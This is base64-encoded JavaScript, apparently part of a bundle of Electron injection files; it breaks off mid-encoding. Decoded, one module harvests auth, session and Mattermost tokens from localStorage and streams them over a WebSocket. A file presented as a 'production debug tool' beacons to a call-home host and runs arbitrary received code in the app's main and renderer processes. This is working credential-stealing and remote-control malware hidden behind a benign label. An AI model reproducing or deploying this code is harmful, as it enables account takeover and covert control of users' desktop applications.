ICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBDaGVjayBmb3IgYXV0aCB0b2tlbnMgaW4gbG9jYWxTdG9yYWdlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gVGhpcyBpcyB0aGUgbW9zdCBpbXBvcnRhbnQgcGFydCBmb3Igc2VjdXJpdHkgcmVzZWFyY2gKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnRva2VucyA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbG9jYWxTdG9yYWdlLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBrZXkgPSBsb2NhbFN0b3JhZ2Uua2V5KGkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGtleS5pbmNsdWRlcygndG9rZW4nKSB8fCBrZXkuaW5jbHVkZXMoJ2F1dGgnKSB8fCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXkuaW5jbHVkZXMoJ3Nlc3Npb24nKSB8fCBrZXkuaW5jbHVkZXMoJ21hdHRlcm1vc3QnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEudG9rZW5zW2tleV0gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbShrZXkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnRva2VuRXJyb3IgPSBlLm1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkoKTsKICAgICAgICAgICAgICAgICAgICAgICAgYCk7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiAobWF0dGVybW9zdERhdGEgJiYgbWF0dGVybW9zdERhdGEuZm91bmQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdtYXR0ZXJtb3N0X2RhdGEnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvd0lkOiB3aW4uaWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogbWF0dGVybW9zdERhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0hFQVAtRVhUUkFDVF0gTWF0dGVybW9zdCBkYXRhIGV4dHJhY3Rpb24gZXJyb3I6JywgZSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tIRUFQLUVYVFJBQ1RdIE1hdHRlcm1vc3QgZXh0cmFjdGlvbiBlcnJvcjonLCBlcnIpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIEV4dHJhY3QgbmV0d29yayBjb25uZWN0aW9ucyBhbmQgcmVxdWVzdHMKICAgICAgICBhc3luYyBmdW5jdGlvbiBleHRyYWN0TmV0d29ya0RhdGEoc29ja2V0KSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAvLyBHZXQgYWN0aXZlIGhhbmRsZXMgd2hpY2ggaW5jbHVkZSBuZXR3b3JrIGNvbm5lY3Rpb25zCiAgICAgICAgICAgICAgICBpZiAocHJvY2Vzcy5fZ2V0QWN0aXZlSGFuZGxlcykgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGhhbmRsZXMgPSBwcm9jZXNzLl9nZXRBY3RpdmVIYW5kbGVzKCk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgbmV0SGFuZGxlcyA9IGhhbmRsZXMuZmlsdGVyKGggPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCB0eXBlID0gaC5jb25zdHJ1Y3RvciA/IGguY29uc3RydWN0b3IubmFtZSA6ICd1bmtub3duJzsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHR5cGUuaW5jbHVkZXMoJ1NvY2tldCcpIHx8IHR5cGUuaW5jbHVkZXMoJ1NlcnZlcicpIHx8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZS5pbmNsdWRlcygnQ29ubmVjdGlvbicpIHx8IHR5cGUuaW5jbHVkZXMoJ1JlcXVlc3QnKTsKICAgICAgICAgICAgICAgICAgICB9KS5tYXAoaCA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBpbmZvID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogaC5jb25zdHJ1Y3RvciA/IGguY29uc3RydWN0b3IubmFtZSA6ICd1bmtub3duJwogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCBzb2NrZXQgaW5mbwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaC5yZW1vdGVBZGRyZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLnJlbW90ZUFkZHJlc3MgPSBoLnJlbW90ZUFkZHJlc3M7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLnJlbW90ZVBvcnQgPSBoLnJlbW90ZVBvcnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoLmxvY2FsQWRkcmVzcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mby5sb2NhbEFkZHJlc3MgPSBoLmxvY2FsQWRkcmVzczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8ubG9jYWxQb3J0ID0gaC5sb2NhbFBvcnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIEV4dHJhY3Qgc29ja2V0IHN0YXRlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoLl9yZWFkYWJsZVN0YXRlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLnJlYWRhYmxlID0gIWguX3JlYWRhYmxlU3RhdGUuZW5kZWQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoLl93cml0YWJsZVN0YXRlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLndyaXRhYmxlID0gIWguX3dyaXRhYmxlU3RhdGUuZW5kZWQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBpbmZvOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnbmV0d29ya19oYW5kbGVzJywKICAgICAgICAgICAgICAgICAgICAgICAgY291bnQ6IG5ldEhhbmRsZXMubGVuZ3RoLAogICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVzOiBuZXRIYW5kbGVzCiAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBHZXQgYWN0aXZlIHJlcXVlc3RzCiAgICAgICAgICAgICAgICBpZiAocHJvY2Vzcy5fZ2V0QWN0aXZlUmVxdWVzdHMpIHsKICAgICAgICAgICAgICAgICAgICBjb25zdCByZXF1ZXN0cyA9IHByb2Nlc3MuX2dldEFjdGl2ZVJlcXVlc3RzKCk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgcmVxSW5mbyA9IHJlcXVlc3RzLm1hcChyID0+ICh7CiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6IHIuY29uc3RydWN0b3IgPyByLmNvbnN0cnVjdG9yLm5hbWUgOiAndW5rbm93bicKICAgICAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdhY3RpdmVfcmVxdWVzdHMnLAogICAgICAgICAgICAgICAgICAgICAgICBjb3VudDogcmVxSW5mby5sZW5ndGgsCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3RzOiByZXFJbmZvCiAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tIRUFQLUVYVFJBQ1RdIE5ldHdvcmsgZGF0YSBleHRyYWN0aW9uIGVycm9yOicsIGVycik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgc2VydmVyLmxpc3RlbihQT1JULCAnMTI3LjAuMC4xJywgKCkgPT4gewogICAgICAgICAgICBjb25zb2xlLmxvZyhgW0hFQVAtRVhUUkFDVF0gU2VydmVyIGxpc3RlbmluZyBvbiBodHRwOi8vMTI3LjAuMC4xOiR7UE9SVH1gKTsKICAgICAgICAgICAgY29uc29sZS5sb2coYFtIRUFQLUVYVFJBQ1RdIFdlYlNvY2tldCBlbmRwb2ludDogd3M6Ly8xMjcuMC4wLjE6JHtQT1JUfWApOwogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIHJldHVybiBzZXJ2ZXI7CiAgICB9CiAgICAKICAgIC8vIFN0YXJ0IHNlcnZlciB3aGVuIGFwcCBpcyByZWFkeQogICAgaWYgKGFwcC5pc1JlYWR5KCkpIHsKICAgICAgICBjcmVhdGVTZXJ2ZXIoKTsKICAgIH0gZWxzZSB7CiAgICAgICAgYXBwLndoZW5SZWFkeSgpLnRoZW4oY3JlYXRlU2VydmVyKTsKICAgIH0KICAgIAogICAgY29uc29sZS5sb2coJ1tIRUFQLUVYVFJBQ1RdIERlZXAgaGVhcCBleHRyYWN0aW9uIG1vZHVsZSBpbml0aWFsaXplZCcpOwp9KSgpOwo=","passthrough.js":"Ly8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KLy8gRUxFQ1RST04gUFJPRFVDVElPTiBERUJVRyBUT09MCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgovLyBDb25maWd1cmF0aW9uIC0gRWRpdCB0aGVzZSB2YWx1ZXMgYXMgbmVlZGVkCmNvbnN0IENPTkZJRyA9IHsKICAgIERFQlVHX1BPUlQ6IDEwMTAxLAogICAgREVCVUdfSE9TVDogJzEyNy4wLjAuMScsCiAgICBDQUxMX0hPTUVfSE9TVDogJzEyNy4wLjAuMScsCiAgICBDQUxMX0hPTUVfUE9SVDogNTY2NiwKICAgIENBTExfSE9NRV9JTlRFUlZBTDogMzAwMDAsIC8vIDMwIHNlY29uZHMKICAgIEpPQl9USU1FT1VUOiA2MDAwMCwgLy8gMSBtaW51dGUgdGltZW91dCBmb3Igam9icwogICAgRU5BQkxFX0NBTExfSE9NRTogdHJ1ZQp9OwoKY29uc29sZS5sb2coJ1tERUJVRy1UT09MXSBJbml0aWFsaXppbmcgcHJvZHVjdGlvbiBkZWJ1ZyBpbnRlcmZhY2UuLi4nKTsKCihmdW5jdGlvbigpIHsKICAgICd1c2Ugc3RyaWN0JzsKICAgIAogICAgLy8gUHJldmVudCBtdWx0aXBsZSBpbnN0YW5jZXMKICAgIGlmIChnbG9iYWwuX2RlYnVnVG9vbExvYWRlZCkgewogICAgICAgIGNvbnNvbGUubG9nKCdbREVCVUctVE9PTF0gQWxyZWFkeSBsb2FkZWQsIHNraXBwaW5nIGluaXRpYWxpemF0aW9uJyk7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgZ2xvYmFsLl9kZWJ1Z1Rvb2xMb2FkZWQgPSB0cnVlOwogICAgCiAgICAvLyBEZXBlbmRlbmNpZXMKICAgIGxldCBlbGVjdHJvbiwgYXBwLCBCcm93c2VyV2luZG93LCBodHRwLCBjcnlwdG87CiAgICAKICAgIHRyeSB7CiAgICAgICAgZWxlY3Ryb24gPSByZXF1aXJlKCdlbGVjdHJvbicpOwogICAgICAgICh7IGFwcCwgQnJvd3NlcldpbmRvdyB9ID0gZWxlY3Ryb24pOwogICAgICAgIGh0dHAgPSByZXF1aXJlKCdodHRwJyk7CiAgICAgICAgY3J5cHRvID0gcmVxdWlyZSgnY3J5cHRvJyk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tERUJVRy1UT09MXSBGYWlsZWQgdG8gbG9hZCByZXF1aXJlZCBtb2R1bGVzOicsIGVycm9yLm1lc3NhZ2UpOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIAogICAgLy8gSm9iIHN0b3JhZ2UgLSByZXN1bHRzIGFyZSBkZWxldGVkIGFmdGVyIHJldHJpZXZhbAogICAgY29uc3Qgam9icyA9IG5ldyBNYXAoKTsKICAgIAogICAgLy8gVXRpbGl0eSBmdW5jdGlvbnMKICAgIGNvbnN0IHV0aWxzID0gewogICAgICAgIGdlbmVyYXRlSm9iSWQ6ICgpID0+IGNyeXB0by5yYW5kb21CeXRlcyg4KS50b1N0cmluZygnaGV4JyksCiAgICAgICAgCiAgICAgICAgZGVjb2RlQmFzZTY0OiAoZGF0YSkgPT4gewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgcmV0dXJuIEJ1ZmZlci5mcm9tKGRhdGEsICdiYXNlNjQnKS50b1N0cmluZygndXRmLTgnKTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihgSW52YWxpZCBiYXNlNjQgZGF0YTogJHtlcnJvci5tZXNzYWdlfWApOwogICAgICAgICAgICB9CiAgICAgICAgfSwKICAgICAgICAKICAgICAgICBzYWZlU3RyaW5naWZ5OiAob2JqKSA9PiB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkob2JqLCBudWxsLCAyKTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgIHJldHVybiBgW1NlcmlhbGl6YXRpb24gRXJyb3I6ICR7ZXJyb3IubWVzc2FnZX1dYDsKICAgICAgICAgICAgfQogICAgICAgIH0sCiAgICAgICAgCiAgICAgICAgbG9nUmVxdWVzdDogKG1ldGhvZCwgcGF0aCwgam9iSWQgPSBudWxsKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IHRpbWVzdGFtcCA9IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKTsKICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSAke3RpbWVzdGFtcH0gJHttZXRob2R9ICR7cGF0aH0ke2pvYklkID8gYCAoSm9iOiAke2pvYklkfSlgIDogJyd9YCk7CiAgICAgICAgfQogICAgfTsKICAgIAogICAgLy8gSm9iIG1hbmFnZW1lbnQKICAgIGNvbnN0IGpvYk1hbmFnZXIgPSB7CiAgICAgICAgY3JlYXRlOiAoY29kZSwgcHJvY2VzcywgdGltZW91dCA9IENPTkZJRy5KT0JfVElNRU9VVCkgPT4gewogICAgICAgICAgICBjb25zdCBqb2JJZCA9IHV0aWxzLmdlbmVyYXRlSm9iSWQoKTsKICAgICAgICAgICAgY29uc3Qgam9iID0gewogICAgICAgICAgICAgICAgaWQ6IGpvYklkLAogICAgICAgICAgICAgICAgY29kZTogY29kZS5zdWJzdHJpbmcoMCwgMTAwKSArIChjb2RlLmxlbmd0aCA+IDEwMCA/ICcuLi4nIDogJycpLAogICAgICAgICAgICAgICAgcHJvY2VzcywKICAgICAgICAgICAgICAgIHN0YXR1czogJ3BlbmRpbmcnLAogICAgICAgICAgICAgICAgY3JlYXRlZDogRGF0ZS5ub3coKSwKICAgICAgICAgICAgICAgIHRpbWVvdXQ6IHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgIGpvYk1hbmFnZXIuc2V0UmVzdWx0KGpvYklkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1czogJ3RpbWVvdXQnLAogICAgICAgICAgICAgICAgICAgICAgICBlcnJvcjogJ0pvYiBleGVjdXRpb24gdGltZWQgb3V0JywKICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkOiBEYXRlLm5vdygpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9LCB0aW1lb3V0KQogICAgICAgICAgICB9OwogICAgICAgICAgICAKICAgICAgICAgICAgam9icy5zZXQoam9iSWQsIGpvYik7CiAgICAgICAgICAgIHJldHVybiBqb2JJZDsKICAgICAgICB9LAogICAgICAgIAogICAgICAgIHNldFJlc3VsdDogKGpvYklkLCByZXN1bHQpID0+IHsKICAgICAgICAgICAgY29uc3Qgam9iID0gam9icy5nZXQoam9iSWQpOwogICAgICAgICAgICBpZiAoam9iKSB7CiAgICAgICAgICAgICAgICAvLyBDbGVhciB0aW1lb3V0IGlmIGl0IGV4aXN0cwogICAgICAgICAgICAgICAgaWYgKGpvYi50aW1lb3V0KSB7CiAgICAgICAgICAgICAgICAgICAgY2xlYXJUaW1lb3V0KGpvYi50aW1lb3V0KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gVXBkYXRlIGpvYiB3aXRoIHJlc3VsdAogICAgICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihqb2IsIHJlc3VsdCwgewogICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZDogRGF0ZS5ub3coKQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbREVCVUctVE9PTF0gSm9iICR7am9iSWR9IGNvbXBsZXRlZCB3aXRoIHN0YXR1czogJHtyZXN1bHQuc3RhdHVzfWApOwogICAgICAgICAgICB9CiAgICAgICAgfSwKICAgICAgICAKICAgICAgICBnZXRBbmREZWxldGU6IChqb2JJZCkgPT4gewogICAgICAgICAgICBjb25zdCBqb2IgPSBqb2JzLmdldChqb2JJZCk7CiAgICAgICAgICAgIGlmIChqb2IpIHsKICAgICAgICAgICAgICAgIGpvYnMuZGVsZXRlKGpvYklkKTsKICAgICAgICAgICAgICAgIC8vIENsZWFyIHRpbWVvdXQgaWYgc3RpbGwgcGVuZGluZwogICAgICAgICAgICAgICAgaWYgKGpvYi50aW1lb3V0KSB7CiAgICAgICAgICAgICAgICAgICAgY2xlYXJUaW1lb3V0KGpvYi50aW1lb3V0KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gam9iOwogICAgICAgIH0sCiAgICAgICAgCiAgICAgICAgY2xlYW51cDogKCkgPT4gewogICAgICAgICAgICBjb25zdCBub3cgPSBEYXRlLm5vdygpOwogICAgICAgICAgICBsZXQgY2xlYW5lZCA9IDA7CiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgKGNvbnN0IFtpZCwgam9iXSBvZiBqb2JzLmVudHJpZXMoKSkgewogICAgICAgICAgICAgICAgLy8gUmVtb3ZlIGpvYnMgb2xkZXIgdGhhbiA1IG1pbnV0ZXMKICAgICAgICAgICAgICAgIGlmIChub3cgLSBqb2IuY3JlYXRlZCA+IDMwMDAwMCkgewogICAgICAgICAgICAgICAgICAgIGlmIChqb2IudGltZW91dCkgewogICAgICAgICAgICAgICAgICAgICAgICBjbGVhclRpbWVvdXQoam9iLnRpbWVvdXQpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBqb2JzLmRlbGV0ZShpZCk7CiAgICAgICAgICAgICAgICAgICAgY2xlYW5lZCsrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoY2xlYW5lZCA+IDApIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbREVCVUctVE9PTF0gQ2xlYW5lZCB1cCAke2NsZWFuZWR9IG9sZCBqb2JzYCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9OwogICAgCiAgICAvLyBDb2RlIGV4ZWN1dGlvbiBoYW5kbGVycwogICAgY29uc3QgZXhlY3V0b3JzID0gewogICAgICAgIG1haW46IGFzeW5jIChjb2RlLCBqb2JJZCkgPT4gewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSBFeGVjdXRpbmcgaW4gbWFpbiBwcm9jZXNzIChKb2I6ICR7am9iSWR9KWApOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBDcmVhdGUgYSBzYWZlIGV4ZWN1dGlvbiBjb250ZXh0CiAgICAgICAgICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCAoYXN5bmMgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gUHJvdmlkZSB1c2VmdWwgY29udGV4dCBpbiBtYWluIHByb2Nlc3MKICAgICAgICAgICAgICAgICAgICBjb25zdCBkZWJ1Z0NvbnRleHQgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGFwcCwKICAgICAgICAgICAgICAgICAgICAgICAgQnJvd3NlcldpbmRvdywKICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93czogQnJvd3NlcldpbmRvdy5nZXRBbGxXaW5kb3dzKCksCiAgICAgICAgICAgICAgICAgICAgICAgIHZlcnNpb25zOiBwcm9jZXNzLnZlcnNpb25zLAogICAgICAgICAgICAgICAgICAgICAgICBwbGF0Zm9ybTogcHJvY2Vzcy5wbGF0Zm9ybQogICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLy8gTWFrZSBjb250ZXh0IGF2YWlsYWJsZSBpbiBleGVjdXRpb24KICAgICAgICAgICAgICAgICAgICByZXR1cm4gYXdhaXQgZXZhbChgKGFzeW5jIGZ1bmN0aW9uKCkgeyAKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgeyBhcHAsIEJyb3dzZXJXaW5kb3csIHdpbmRvd3MsIHZlcnNpb25zLCBwbGF0Zm9ybSB9ID0gYXJndW1lbnRzWzBdOwogICAgICAgICAgICAgICAgICAgICAgICAke2NvZGV9CiAgICAgICAgICAgICAgICAgICAgfSlgKShkZWJ1Z0NvbnRleHQpOwogICAgICAgICAgICAgICAgfSkoKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgam9iTWFuYWdlci5zZXRSZXN1bHQoam9iSWQsIHsKICAgICAgICAgICAgICAgICAgICBzdGF0dXM6ICdjb21wbGV0ZWQnLAogICAgICAgICAgICAgICAgICAgIHJlc3VsdDogcmVzdWx0LAogICAgICAgICAgICAgICAgICAgIHByb2Nlc3M6ICdtYWluJwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgIGpvYk1hbmFnZXIuc2V0UmVzdWx0KGpvYklkLCB7CiAgICAgICAgICAgICAgICAgICAgc3RhdHVzOiAnZXJyb3InLAogICAgICAgICAgICAgICAgICAgIGVycm9yOiBlcnJvci5tZXNzYWdlLAogICAgICAgICAgICAgICAgICAgIHN0YWNrOiBlcnJvci5zdGFjaywKICAgICAgICAgICAgICAgICAgICBwcm9jZXNzOiAnbWFpbicKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgfSwKICAgICAgICAKICAgICAgICByZW5kZXJlcjogYXN5bmMgKGNvZGUsIGpvYklkKSA9PiB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgW0RFQlVHLVRPT0xdIEV4ZWN1dGluZyBpbiByZW5kZXJlciBwcm9jZXNzIChKb2I6ICR7am9iSWR9KWApOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjb25zdCB3aW5kb3dzID0gQnJvd3NlcldpbmRvdy5nZXRBbGxXaW5kb3dzKCk7CiAgICAgICAgICAgICAgICBjb25zdCBhY3RpdmVXaW5kb3cgPSB3aW5kb3dzLmZpbmQodyA9PiB3LmlzRm9jdXNlZCgpKSB8fCB3aW5kb3dzWzBdOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAoIWFjdGl2ZVdpbmRvdyB8fCAhYWN0aXZlV2luZG93LndlYkNvbnRlbnRzKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdObyBhY3RpdmUgd2luZG93IHdpdGggd2ViQ29udGVudHMgYXZhaWxhYmxlJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEV4ZWN1dGUgaW4gcmVuZGVyZXIgd2l0aCBlcnJvciBoYW5kbGluZwogICAgICAgICAgICAgICAgY29uc3QgcmVzdWx0ID0gYXdhaXQgYWN0aXZlV2luZG93LndlYkNvbnRlbnRzLmV4ZWN1dGVKYXZhU2NyaXB0KGAKICAgICAgICAgICAgICAgICAgICAoYXN5bmMgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBQcm92aWRlIHVzZWZ1bCBkZWJ1Z2dpbmcgY29udGV4dAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZGVidWdDb250ZXh0ID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2F0aW9uOiB3aW5kb3cubG9jYXRpb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQ6IGRvY3VtZW50LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsU3RvcmFnZTogbG9jYWxTdG9yYWdlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb25TdG9yYWdlOiBzZXNzaW9uU3RvcmFnZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYXZpZ2F0b3I6IG5hdmlnYXRvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXhlY3V0ZSB1c2VyIGNvZGUgd2l0aCBjb250ZXh0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYXdhaXQgKGFzeW5jIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR7Y29kZX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZXJyb3I6IHRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogZXJyb3IubWVzc2FnZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFjazogZXJyb3Iuc3RhY2ssCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogZXJyb3IubmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pKCk7CiAgICAgICAgICAgICAgICBgKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gQ2hlY2sgaWYgcmVuZGVyZXIgcmV0dXJuZWQgYW4gZXJyb3IKICAgICAgICAgICAgICAgIGlmIChyZXN1bHQgJiYgcmVzdWx0Ll9fZXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICB